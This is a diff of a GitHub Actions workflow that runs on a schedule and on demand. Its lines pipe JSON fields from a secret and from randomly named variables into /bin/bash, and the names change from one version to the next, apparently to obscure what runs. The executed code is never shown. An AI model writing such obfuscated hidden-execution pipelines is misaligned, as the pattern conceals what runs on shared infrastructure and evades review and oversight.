@@ -1,20 +1,30 @@
 name: bushitaixiaogj
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 2/6 * * *'
-jobs:  # 6079
+    - cron: '46 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: bushitaixiaogj
         env:
-          kq59097: ${{ secrets.kq59097 }}
+          mnxs3: ${{ secrets.mnxs3 }}
         run: |
-          echo $kq59097 | jq -r .mj58886 | /bin/bash
-          echo $n41308 | jq -r .uwqlz6 | /bin/bash
-          echo $w7046 | jq -r .cej698 | /bin/bash
-          echo $mskfy60 | jq -r .kst99 | /bin/bash
+          echo $mnxs3 | jq -r .h7999 | /bin/bash
+          echo $r6 | jq -r .j210 | /bin/bash
+          echo $llg478 | jq -r .ko54924 | /bin/bash
+          echo $jvog31849 | jq -r .p2905 | /bin/bash
+          echo $kethj79145 | jq -r .gp0 | /bin/bash
+          echo $enott343 | jq -r .zp4 | /bin/bash
+          echo $xhvev56 | jq -r .j018 | /bin/bash
+          echo $pe51 | jq -r .hqq1 | /bin/bash
+          echo $m6502 | jq -r .nhvb927 | /bin/bash
+          echo $vugib440 | jq -r .uuev6566 | /bin/bash
+          echo $qgs5136 | jq -r .pce4 | /bin/bash
+          echo $reyvz09 | jq -r .e2304 | /bin/bash
+          echo $fimq10 | jq -r .gb9128 | /bin/bash
 
